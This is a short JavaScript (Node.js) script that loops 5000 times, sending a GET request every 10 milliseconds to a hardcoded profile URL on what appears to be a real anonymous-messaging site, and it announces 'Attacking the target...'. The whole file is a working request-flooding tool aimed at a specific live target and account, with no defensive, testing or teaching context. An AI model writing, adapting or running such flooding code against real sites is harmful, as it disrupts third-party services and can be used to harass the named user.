import got from "got";

const url = "https://sarhne.sarahah.pro/abdalrhmanfoly"; 
const requests = 5000; 
const delay = 10; 

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

(async () => {
    console.log("🚀 Attacking the target...");

    for (let i = 0; i < requests; i++) {
        try {
            await got(url);
            console.log(`[okS] Request ${i + 1} is done!`);
        } catch (err) {
            console.log(`[notS] Request ${i + 1} failed: ${err.response ? err.response.statusCode : err.message}`);
        }
        
        await sleep(delay);
    }

    console.log(" All requests are done!");
})();




